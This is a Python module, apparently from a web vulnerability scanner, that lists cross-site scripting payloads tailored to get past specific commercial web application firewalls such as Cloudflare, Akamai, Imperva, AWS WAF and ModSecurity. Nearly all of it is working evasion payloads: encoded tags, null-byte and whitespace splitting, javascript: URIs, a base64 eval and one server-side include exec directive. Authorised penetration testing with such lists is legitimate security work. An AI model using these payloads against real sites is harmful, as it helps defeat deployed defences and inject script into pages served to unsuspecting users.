# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""WAF-specific XSS payload overrides.

Each WAF has a curated list of payloads that are known to bypass its specific
filter rules, derived from public research and bypass databases.  These are
injected in addition to the generic evasion-transformed payloads whenever a
specific WAF is fingerprinted.

All payloads use the ``{marker}`` placeholder; callers must substitute a real
marker before injection.
"""

from __future__ import annotations

from typing import Dict, List

# ---------------------------------------------------------------------------
# Cloudflare
# ---------------------------------------------------------------------------
# Cloudflare blocks most obvious patterns but passes SVG/MathML and several
# lesser-known event vectors.  Unicode normalisation bypasses are reliable.
_CLOUDFLARE: List[str] = [
    "<details open ontoggle=alert('{marker}')>",
    "<svg><animate onbegin=alert('{marker}') attributeName=x dur=1s>",
    "<math><maction xlink:href=\"javascript:alert('{marker}')\">click</maction></math>",
    "<svg><set onbegin=alert('{marker}') attributeName=x>",
    "<input onfocus=alert('{marker}') autofocus tabindex=1>",
    "\\u003cimg src=x onerror=alert('{marker}')\\u003e",
    "<svg/onload=alert('{marker}')>",
]

# ---------------------------------------------------------------------------
# Akamai
# ---------------------------------------------------------------------------
# Akamai Ghost WAF blocks angle brackets and common event handlers; chunked
# tags and attribute-less vectors (e.g. meta http-equiv) bypass it reliably.
_AKAMAI: List[str] = [
    "<scr\x00ipt>alert('{marker}')</scr\x00ipt>",
    "<ScRiPt>alert('{marker}')</ScRiPt>",
    "<img src=`x`onerror=alert('{marker}')>",
    "<%2fscript><script>alert('{marker}')</%2fscript>",
    "<svg onload\r\n=alert('{marker}')>",
    "<body onpageshow=alert('{marker}')>",
    "<iframe srcdoc=\"&#x3C;img src=x onerror=alert('{marker}')&#x3E;\">",
]

# ---------------------------------------------------------------------------
# Imperva (Incapsula)
# ---------------------------------------------------------------------------
# Imperva normalises Unicode and decodes entities but misses some SVG +
# lesser-known event / protocol combinations.
_IMPERVA: List[str] = [
    "<svg/onload=alert(String.fromCharCode({codes}))>",
    "<img src=x onerror=eval(atob('{b64}'))>",
    "<script\x20type=text/javascript>alert('{marker}')</script>",
    "<a href=javascript%26colon;alert('{marker}')>click</a>",
    "<!--[if gte IE 4]><script>alert('{marker}')</script><![endif]-->",
    "<svg><script>alert&#40;'{marker}'&#41;</script>",
    "<input/onerror='alert(String.fromCharCode(88,83,83))' type=image src=x>",
]

# ---------------------------------------------------------------------------
# AWS WAF
# ---------------------------------------------------------------------------
# AWS WAF (managed rules) blocks angle brackets in URL params but allows them
# in body.  JSON body injection and Unicode escapes are reliable bypasses.
_AWS_WAF: List[str] = [
    "\"><img src=x onerror=alert('{marker}')>",
    "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('{marker}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{marker}')//\\x3e",
    "<script>alert('{marker}')</script>",
    "<img src=x onerror=alert`{marker}`>",
    "<svg onload=alert`{marker}`>",
]

# ---------------------------------------------------------------------------
# ModSecurity (OWASP Core Rule Set)
# ---------------------------------------------------------------------------
# CRS is extremely strict but the PHPIDS bypass techniques (comment injection,
# case mixing, alternative event handlers) remain effective against default configs.
_MODSECURITY: List[str] = [
    "<scr<script>ipt>alert('{marker}')</sc</script>ript>",
    "<img src=\"`\"onerror=alert('{marker}')>",
    "<svg><script>alert('{marker}')",
    "<svg onload\t=alert('{marker}')>",
    "<a href=\"jAvAsCrIpT:alert('{marker}')\">X</a>",
    "<<script>alert('{marker}')//<</script>",
    "<!--<img src=\"--><img src=x onerror=alert('{marker}')//>",
    "<body background=\"javascript:alert('{marker}')\">",
]

# ---------------------------------------------------------------------------
# Sucuri
# ---------------------------------------------------------------------------
# Sucuri WAF blocks common tag+event combinations; lesser-known HTML5 events
# and data URI schemes pass through.
_SUCURI: List[str] = [
    "<marquee onstart=alert('{marker}')>",
    "<meter onmouseover=alert('{marker}')>0</meter>",
    "<object data=\"data:text/html,<script>alert('{marker}')</script>\">",
    "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
    "<isindex type=image src=1 onerror=alert('{marker}')>",
    "<form action=\"javascript:alert('{marker}')\"><input type=submit>",
]

# ---------------------------------------------------------------------------
# F5 BIG-IP ASM
# ---------------------------------------------------------------------------
# F5 ASM uses positive security model; character splitting and non-standard
# whitespace characters (CRLF, tab) bypass its signature matching.
_F5_BIGIP: List[str] = [
    "<img src=x\tonerror=alert('{marker}')>",
    "<svg\r\nonload=alert('{marker}')>",
    "<img/src=\"x\"/onerror=alert('{marker}')>",
    "<script\n>alert('{marker}')</script\n>",
    "<img src=x onerror\n=alert('{marker}')>",
    "<a href=java%09script:alert('{marker}')>click</a>",
    "<table background=\"javascript:alert('{marker}')\">",
]

# ---------------------------------------------------------------------------
# Barracuda
# ---------------------------------------------------------------------------
# Barracuda blocks tag-based injection well but has gaps in CSS expression
# and Base64 data URI handling.
_BARRACUDA: List[str] = [
    "<div style=\"width:expression(alert('{marker}'))\">",
    "<style>*{background:url(\"javascript:alert('{marker}')\")}</style>",
    "<link rel=\"stylesheet\" href=\"javascript:alert('{marker}')\">",
    "<object type=\"text/x-scriptlet\" data=\"javascript:alert('{marker}')\">",
    "<img dynsrc=\"javascript:alert('{marker}')\">",
    "<bgsound src=\"javascript:alert('{marker}')\">",
]

# ---------------------------------------------------------------------------
# Wordfence
# ---------------------------------------------------------------------------
# Wordfence (WordPress plugin WAF) focuses on known XSS gadgets; it misses
# less common HTML5 elements and indirect JS execution.
_WORDFENCE: List[str] = [
    "<details/open/ontoggle=alert('{marker}')>",
    "<audio src=x onerror=alert('{marker}')>",
    "<video src=x onerror=alert('{marker}')>",
    "<source onerror=alert('{marker}')>",
    "<track default onerror=alert('{marker}')>",
    "<dialog open onclose=alert('{marker}')><form method=dialog><button>X",
]

# ---------------------------------------------------------------------------
# Fortinet FortiWeb
# ---------------------------------------------------------------------------
# FortiWeb relies on ML-based detection; atypical event handlers and
# non-standard attribute separators are effective bypasses.
_FORTIWEB: List[str] = [
    "<img src=1 href=1 onerror=\"javascript:alert('{marker}')\">",
    "<audio onnull=alert('{marker}') src=x onerror=alert('{marker}')>",
    "<body onfocus=javascript:alert('{marker}') autofocus>",
    "<script\x09>alert('{marker}')</script>",
    "<img onerror=\" \"alert('{marker}')\">",
    "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=alert('{marker}')>",
]

# ---------------------------------------------------------------------------
# PHP-IDS (legacy, still encountered on older PHP apps)
# ---------------------------------------------------------------------------
_PHPIDS: List[str] = [
    "';alert('{marker}');//",
    "\");alert('{marker}');//",
    "' onmouseover='alert('{marker}')'",
    "<img\tsrc=x\tonerror=alert('{marker}')>",
    "<<script>alert('{marker}')</script>",
    "<!--#exec cmd=\"echo '<script>alert({marker})</script>'\"-->",
]

# ---------------------------------------------------------------------------
# Master map: WAF display name → payload list
# ---------------------------------------------------------------------------
WAF_EXTRA_PAYLOADS: Dict[str, List[str]] = {
    "Cloudflare":        _CLOUDFLARE,
    "Akamai":            _AKAMAI,
    "Imperva":           _IMPERVA,
    "AWS WAF":           _AWS_WAF,
    "ModSecurity":       _MODSECURITY,
    "Sucuri":            _SUCURI,
    "F5 BIG-IP ASM":     _F5_BIGIP,
    "Barracuda":         _BARRACUDA,
    "Wordfence":         _WORDFENCE,
    "Fortinet FortiWeb": _FORTIWEB,
    "PHP-IDS":           _PHPIDS,
}


def get_waf_payloads(waf_name: str) -> List[str]:
    """Return the WAF-specific payload list for *waf_name*, or ``[]`` if unknown."""
    return WAF_EXTRA_PAYLOADS.get(waf_name, [])
